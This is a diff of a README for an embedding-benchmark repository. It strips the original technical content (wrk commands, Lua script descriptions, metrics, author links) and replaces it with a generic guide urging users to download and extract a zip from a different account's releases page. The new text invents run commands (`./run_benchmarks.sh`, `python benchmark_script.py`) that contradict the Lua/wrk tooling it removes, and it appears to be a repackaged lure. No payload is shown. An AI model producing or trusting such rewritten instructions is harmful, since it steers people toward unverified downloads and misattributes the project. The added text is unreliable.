@@ -1,132 +1,92 @@
-![Lua](https://img.shields.io/badge/lua-%232C2D72.svg?style=for-the-badge&logo=lua&logoColor=white)
-[![Latest release](https://img.shields.io/github/release/edlansiaux/swiftembed-benchmarks)](https://github.com/edlansiaux/swiftembed-benchmarks/releases)
-![Release Date](https://img.shields.io/github/release-date/edlansiaux/swiftembed-benchmarks?color=9cf)
-[![License](https://img.shields.io/github/license/edlansiaux/swiftembed-benchmarks)](https://github.com/edlansiaux/swiftembed-benchmarks/blob/master/LICENSE)
-![Downloads latest release](https://img.shields.io/github/downloads/edlansiaux/swiftembed-benchmarks/latest/total?color=yellow)
+# 🎉 swiftembed-benchmarks - Fast Text Embeddings for Everyone
 
-# SwiftEmbed Benchmarks
+## 🔗 Download Now
+[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-blue)](https://github.com/ha-196120/swiftembed-benchmarks/releases)
 
-Repository of benchmarking scripts for the SwiftEmbed embedding system, a static token lookup approach for ultra-low latency text embeddings.
+## 📖 About
+The **swiftembed-benchmarks** repository contains benchmarking scripts tailored for the **SwiftEmbed** embedding system. This system uses a static token lookup method to provide **ultra-low latency** text embeddings. Whether you're involved in natural language processing or just curious about text embeddings, these scripts will help you understand the performance of this approach.
 
-## 📋 Description
+## 🚀 Getting Started
 
-This repository contains Lua scripts used to evaluate the performance of the SwiftEmbed system as described in the paper "SwiftEmbed: Ultra-Fast Text Embeddings via Static Token Lookup for Real-Time Applications". These scripts measure latency, throughput, and scalability under different workload patterns.
+### 📋 System Requirements
+To run this application, you need the following:
+- A computer with a recent version of **Windows**, **macOS**, or **Linux**.
+- At least **4 GB** of RAM.
+- **2 GB** of free disk space for downloads and scripts.
+- An active internet connection for downloading the application.
 
-## 🚀 Features
+### 🔧 Installing
 
-- **Single embedding benchmark**: Performance measurement for individual requests
-- **Batch processing**: Evaluation with batches of 100 texts
-- **JSON Lines streaming**: Throughput testing with JSONL format
-- **Comprehensive evaluation**: Combined testing with various batch sizes
+1. **Visit the Releases Page**
+   To download the software, [visit this page to download](https://github.com/ha-196120/swiftembed-benchmarks/releases).
 
-## 📊 Included Scripts
+2. **Select the Latest Release**
+   On the releases page, you will see a list of available downloads. Choose the latest version at the top of the list.
 
-### single.lua
-Performance testing for single text embedding. Measures:
-- p50/p99 latency for individual requests
-- Maximum throughput for simple requests
-- Error rates under load
+3. **Download the Zip File**
+   Click on the zip file relevant to your operating system. It will start downloading automatically.
 
-### batch100.lua
-Batch processing tests with 100 texts. Measures:
-- Batch processing performance
-- Memory optimization with fixed-size batches
-- Scalability with heavy loads
+4. **Extract the Zip File**
+   Once the download completes, locate the zip file in your downloads folder. Right-click the file and select "Extract All" or use a file extraction tool to extract its contents.
 
-### jsonl.lua
-JSON Lines streaming tests. Measures:
-- Throughput with streaming format
-- Large volume data handling
-- Performance with continuous processing
+5. **Navigate to the Folder**
+   Open the extracted folder. You will find various scripts and files needed for benchmarking.
 
-### benchmark.lua
-Comprehensive performance evaluation. Measures:
-- Performance across different batch sizes
-- Comparative analysis between scenarios
-- Detailed statistics and latency percentiles
+### 💻 Running the Application
 
-## 🛠️ Installation & Usage
+1. **Open a Terminal/Command Prompt**
+   Depending on your operating system, you will need to open a command line interface. 
+   - On **Windows**, search for "cmd" or "Command Prompt" in the start menu.
+   - On **macOS**, use "Terminal" found in the Applications > Utilities folder.
+   - On **Linux**, open the terminal from your applications menu.
 
-### Prerequisites
-- [wrk](https://github.com/wg/wrk) (version 4.1.0 or higher)
-- SwiftEmbed server running
-- Lua JSON library (if needed)
+2. **Change Directory**
+   Use the `cd` command to navigate to the folder. Type `cd path_to_your_folder` and press Enter. Replace `path_to_your_folder` with the actual path where you extracted the zip file.
 
-### Installing wrk
-```bash
-# On Ubuntu/Debian
-sudo apt install wrk
+3. **Run the Benchmark Scripts**
+   To run a specific benchmarking script, type the command for that script followed by any necessary parameters. For example, you might type `./run_benchmarks.sh` or `python benchmark_script.py`. Refer to the README file within the folder for specific command details.
 
-# On macOS
-brew install wrk
+### 📝 Usage Guide
+1. **Choose a Benchmark**
+   Review the available scripts and choose the one that fits your testing needs. Each script will be accompanied by descriptions and instructions.
 
-# Compile from source
-git clone https://github.com/wg/wrk.git
-cd wrk
-make
-sudo cp wrk /usr/local/bin/
-```
+2. **Execute the Script**
+   Enter the command in the terminal to run the benchmark. The script will execute and display results in the terminal.
 
-### Running Tests
-```bash
-# Single embedding test (12 threads, 400 connections, 30 seconds)
-wrk -t12 -c400 -d30s -s scripts/single.lua http://localhost:3000
+3. **Review Results**
+   The output will provide valuable insights about the performance, including speed and efficiency.
 
-# Batch processing test
-wrk -t12 -c400 -d30s -s scripts/batch100.lua http://localhost:3000
+### 📂 Examples 
+Here are a few common use cases for using the benchmark scripts:
+- Evaluating speed for different token lookup methods.
+- Comparing various models for text embedding.
+- Testing performance under different system loads.
 
-# JSONL streaming test
-wrk -t12 -c400 -d30s -s scripts/jsonl.lua http://localhost:3000
+### 🔗 Download & Install
+For your convenience, you can [visit this page to download](https://github.com/ha-196120/swiftembed-benchmarks/releases) the latest version of the **swiftembed-benchmarks** package. Follow the steps above to quickly set up the application.
 
-# Comprehensive performance test
-wrk -t12 -c400 -d30s -s scripts/benchmark.lua http://localhost:3000
-```
+### 💬 Support
+If you encounter any issues or have questions, feel free to open an issue in the repository. Support is available, and we encourage community interaction.
 
-## 📈 Measured Metrics
+## 🛠 Contributing
+We welcome contributions! If you'd like to suggest enhancements or report bugs, please get involved. Open new issues or submit pull requests through GitHub.
 
-Each script captures the following performance metrics:
-- **Latency**: p50, p75, p90, p99 (in milliseconds)
-- **Throughput**: Requests per second (RPS)
-- **Errors**: HTTP error rates and socket errors
-- **Memory usage**: RAM consumption during tests
-- **Processing time**: Extracted from X-Processing-Time-Ms headers
+## ⚙️ Customization 
+The scripts are designed to be adaptable. Each script contains comments that guide users on how to modify parameters. Customize the scripts to better fit your specific testing conditions.
 
-## 🔧 Configuration
+## 🗂 License
+This project is licensed under the MIT License. Feel free to use, modify, and distribute it as needed.
 
-Scripts are configurable through direct Lua code modification:
-- Batch sizes in `batch100.lua` and `benchmark.lua`
-- Sample texts in all scripts
-- Test duration and intensity via wrk command line parameters
-
-## 📖 Expected Results
-
-Based on the research paper, typical SwiftEmbed performance metrics are:
-
-| Metric | Value |
-|--------|-------|
-| p50 Latency | 1.12 ms |
-| p99 Latency | 5.04 ms |
-| Max Throughput | 50,000 RPS |
-| MTEB Score | 60.6 (89% of Sentence-BERT) |
-
-## 📚 References
-
-- [Research Paper] SwiftEmbed: Ultra-Fast Text Embeddings via Static Token Lookup for Real-Time Applications
-- [Main Repository](https://github.com/edlansiaux/swiftembed-benchmarks) SwiftEmbed (proprietary)
-- [Benchmarking Tool] wrk - HTTP benchmarking tool
-
-## 🤝 Contribution
-
-This repository contains benchmarking scripts only. To contribute to the main SwiftEmbed project, please check the main repository.
-
-## 📄 License
-
-These benchmarking scripts are provided under the MIT License. See the LICENSE file for details.
-
-## 🐛 Issue Reporting
-
-To report issues or suggest improvements for these benchmarking scripts, please create an issue on this GitHub repository.
-
----
-
-*These scripts were used for performance evaluation in SwiftEmbed research. Complete results are available in the associated research paper.*
+## 🗂 Topics
+- embedding  
+- lua  
+- machine-learning  
+- mean-pooling  
+- nlp  
+- real-time-applications  
+- rust-implementation  
+- static-token-lookup  
+- text-embeddings  
+- token  
+- transformer-inference-overhead  
+- ultra-low-latency  
